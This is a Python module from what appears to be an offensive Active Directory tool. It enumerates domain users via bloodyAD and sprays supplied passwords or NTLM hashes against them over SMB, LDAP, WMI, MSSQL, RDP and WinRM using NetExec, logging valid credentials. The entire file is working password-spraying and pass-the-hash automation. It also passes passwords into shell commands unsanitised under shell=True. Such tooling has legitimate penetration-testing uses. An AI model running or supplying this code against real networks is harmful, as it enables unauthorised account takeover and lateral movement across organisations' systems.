import re
import subprocess

from utils.logger import write_log
from watchers.creds_watcher import watch_creds

NTHASH_PORTS = {135: "wmi", 389: "ldap", 445: "smb", 1433: "mssql", 3389: "rdp", 5985: "winrm"}

def start_spraying(context):
    if not context.creds_exist():
        write_log(context.log_file, f"No credentials supplied - now watching for new entries in creds.txt and enumerating users once creds are supplied")
        write_log(context.log_file, f"Add creds to spray against known users: echo <username>:'<password/nthash>' >> creds.txt")
        watch_creds(context)
    enum_users(context)
    while True:
        watch_creds(context)

def enum_users(context):
    write_log(context.log_file, "Initial credential discovered. Enumerating users via LDAP...")
    user, passwd = context.get_initial_cred()
    cmd = f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get search --filter objectClass=User --attr sAMAccountName | grep sAMAccountName | awk '{{print $2}}'"
    # write_log(context.log_file, f"Executing: {cmd}\n")
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            text=True,
            check=True,
            capture_output=True
        )
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.strip() if e.stderr else 'Unknown error'
        write_log(context.log_file, f"bloodyAD subprocess error: {error_msg}", "ERROR")
    except Exception as e:
        write_log(context.log_file, f"bloodyAD subprocess error: {str(e)}", "ERROR")
    if result.returncode == 0:
        new_users = []
        for line in result.stdout.splitlines():
            new_user = line.strip().lower()
            if new_user:
                if new_user != user:
                    context.add_cred(new_user)
                new_users.append(new_user)
        context.spray_users(new_users)
    else:
        write_log(context.log_file, f"bloodyAD subprocess returned non-zero code", "ERROR")

def spray_passwd(target, users_file, passwd, sprayable_ports, log_file):
    valid_protos = {}
    for proto in sprayable_ports.values():
        if is_ntlm_hash(passwd):
            if proto not in NTHASH_PORTS.values():
                continue
            auth_flag = '-H'
        else:
            auth_flag = '-p'
        if proto == 'smb':
            cmd = f"nxc smb {target} -u {users_file} {auth_flag} '{passwd}' -k --continue-on-success"
        else:
            cmd = f"nxc {proto} {target} -u {users_file} {auth_flag} '{passwd}' --continue-on-success"
        # write_log(log_file, f"Executing: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                check=True,
                capture_output=True
            )
        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.strip() if e.stderr else 'Unknown error'
            write_log(log_file, f"NetExec subprocess error: {error_msg}", "ERROR")
            continue
        except Exception as e:
            write_log(log_file, f"NetExec subprocess error: {str(e)}", "ERROR")
            continue
        if result.returncode == 0:
            # write_log(log_file, f"")
            # for line in result.stdout.split('\n'):
            #     write_log(log_file, f"{line.strip()}")
            success_lines = [line.strip() for line in result.stdout.split('\n') if '[+]' in line]
            if success_lines:
                proto_results = []
                for line in success_lines:
                    match = re.search(r'(\S+:\S+)(?:\s+(.*))?$', line)
                    if match:
                        cred = match.group(1)
                        note = match.group(2) if match.group(2) is not None else ""
                        proto_results.append((cred, note))
                if proto_results:
                    valid_protos[proto] = proto_results
        else:
            write_log(log_file, f"NetExec subprocess returned non-zero code", "ERROR")
    if valid_protos:
        write_log(log_file, f"Valid credentials discovered!", "SUCCESS")
        for proto, results in valid_protos.items():
            for cred, note in results:
                write_log(log_file, f"- {proto.upper()}\t{cred}", "SUCCESS", note)
    else:
        write_log(log_file, f"Failed to discover valid credentials :(")
    write_log(log_file, f"Add creds to spray against known users: echo <username>:'<password/nthash>' >> creds.txt")

def is_ntlm_hash(s: str) -> bool:
    return bool(re.fullmatch(r'[0-9a-fA-F]{32}', s))
